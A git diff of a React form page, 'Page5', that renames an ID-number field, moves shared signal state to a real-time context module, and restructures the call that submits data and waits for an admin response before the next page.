@@ -6,9 +6,9 @@ import { useEffect } from "react";
 import { FieldValues, useForm } from "react-hook-form";
 import {
   currentPage,
-  extraInfo,
+  mainInfo,
   sendDataToServer,
-} from "../../context/signals";
+} from "../../real-time/context/signals";
 
 function Page5() {
   const {
@@ -18,12 +18,17 @@ function Page5() {
   } = useForm({ mode: "all" });
 
   function sendData(data: FieldValues) {
-    extraInfo.value.number = data.number;
-
-    sendDataToServer(data, "page5", "page6", true);
+    mainInfo.value = { ...mainInfo.value, idNumber: data.idNumber };
+    sendDataToServer({
+      data,
+      current: "page5",
+      nextPage: "page6",
+      waitingForAdminResponse: true,
+    });
   }
 
   useEffect(() => {
+    // This Step Are Necessary
     currentPage.value = "page5";
   }, []);
   return (
@@ -35,11 +40,11 @@ function Page5() {
         <Input
           errors={errors}
           register={register}
-          id="number"
+          id="idNumber"
           label="رقم"
           type="number"
           isAr
-          value={extraInfo.value.number}
+          value={mainInfo.value?.idNumber}
           options={{
             required: "هذا الحقل ضروري",
             pattern: {
